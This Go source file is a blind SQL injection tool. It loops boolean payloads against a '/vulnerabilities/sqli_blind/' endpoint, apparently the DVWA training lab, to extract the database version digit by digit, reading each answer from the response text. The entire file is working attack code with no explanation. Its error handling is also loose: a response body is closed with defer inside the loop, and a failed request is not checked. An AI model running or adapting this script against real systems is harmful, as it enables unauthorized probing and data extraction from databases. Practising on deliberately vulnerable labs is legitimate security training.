package main

import (
        "fmt"
        "io/ioutil"
        "log"
        "net/http"
        "net/url"
        "os"
        "strconv"
        "strings"
)

type BlindSQLi struct {
        ip        string
        port      string
        phpsessid string
}

func (b BlindSQLi) GetVersion() {
        cookies := "PHPSESSID=" + b.phpsessid + "; security=low"
        client := &http.Client{}

        for i := 1; i < 10; i++ {
                for j := 1; j <= 10; j++ {
                        originalQuery := "1' and substring(version(), " + strconv.Itoa(i) + ",1) = " + strconv.Itoa(j) + "-- -"
                        urlEncodedQuery := url.QueryEscape(originalQuery)

                        fullURL := "http://" + b.ip + ":" + b.port + "/vulnerabilities/sqli_blind/?id=" + urlEncodedQuery + "&Submit=Submit#"
                        getReq, err := http.NewRequest("GET", fullURL, nil)
                        if err != nil {
                                log.Fatal(err)
                        }

                        getReq.Header.Set("Cookie", cookies)

                        resp, err := client.Do(getReq)
                        if err != nil {
                                fmt.Println("Error sending request:", err)
                        }
                        defer resp.Body.Close()

                        // Read the response body
                        body, err := ioutil.ReadAll(resp.Body)
                        if err != nil {
                                fmt.Println("Error reading response body:", err)
                        }

                        if strings.Contains(string(body), "User ID exists in the database.") {
                                fmt.Println("Version-Number: ", strconv.Itoa(j))
                                //                              fmt.Println("Full URL:", fullURL)
                                fmt.Println("Original Query:", originalQuery)
                        }
                }
        }
}

func main() {
        var bs BlindSQLi
        if len(os.Args) < 4 {
                fmt.Println("Usage: ./getversion <ip> <port> <phpsessid>")
        } else {
                bs.ip = os.Args[1]
                bs.port = os.Args[2]
                bs.phpsessid = os.Args[3]
                bs.GetVersion()
        }
}
